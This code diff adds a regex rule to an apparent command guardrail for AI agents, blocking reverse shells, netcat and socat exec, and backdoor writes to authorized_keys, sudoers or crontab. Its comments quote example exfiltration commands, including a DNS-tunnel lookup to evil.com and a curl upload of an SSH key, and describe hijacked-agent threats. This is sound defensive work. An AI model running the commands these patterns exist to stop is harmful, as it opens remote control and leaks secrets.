@@ -88,6 +88,18 @@ EXFIL_RE = re.compile(
 # almost always data exfiltration (e.g. `dig $(cat /etc/passwd | base64).evil.com`), not a real query.
 DNS_TUNNEL_RE = re.compile(r"\b(dig|nslookup|drill|host)\b[^\n]*(\$\(|\x60)")
 
+# Reverse/bind shells and backdoor persistence: a hijacked agent calling home for interactive control or
+# installing a durable backdoor. No secret is present, so the exfil rules above miss these. High-precision:
+# each form is rarely-to-never legitimate in an agent's build/test work.
+BACKDOOR_RE = re.compile(
+    r">&?\s*/dev/tcp/"                                     # bash reverse shell: >& /dev/tcp/host/port
+    r"|\b(nc|ncat|netcat)\b[^\n]*\s(--exec|--sh-exec|-[a-zA-Z]*e[a-zA-Z]*)\b"  # netcat -e/--exec: shell on connect
+    r"|\bsocat\b[^\n]*\b(exec|system)\s*:"                 # socat ... EXEC:/SYSTEM: shell
+    r"|(>>?|\btee\b)[^\n]*\.ssh/authorized_keys"           # SSH backdoor: append a key to authorized_keys
+    r"|(>>?|\btee\b)[^\n]*/etc/sudoers"                    # privilege backdoor: edit sudoers
+    r"|\|\s*crontab\s+-\s*$",                              # cron persistence: install a crontab from stdin
+    re.IGNORECASE)
+
 # Cloud instance-metadata (IMDS) credential theft: fetching the metadata endpoint returns live IAM /
 # service-account credentials with NO secret present in the command, so the exfil-needs-a-secret rule
 # above misses it. This is the cloud analogue of `curl -d @~/.ssh/id_rsa` and is a top agent-hijack move.
@@ -201,6 +213,9 @@ class Guardrail:
         # 1c. DNS tunneling: a lookup name built from a command substitution is data exfiltration
         if DNS_TUNNEL_RE.search(c):
             return "BLOCK", "data exfiltration via DNS tunneling"
+        # 1d. reverse/bind shell or backdoor persistence (callback shell, authorized_keys, sudoers, cron)
+        if BACKDOOR_RE.search(c):
+            return "BLOCK", "reverse shell or backdoor persistence"
         # 2. catastrophic destruction of the repo / home / root / device
         for rx, why in CATASTROPHIC:
             if rx.search(c):
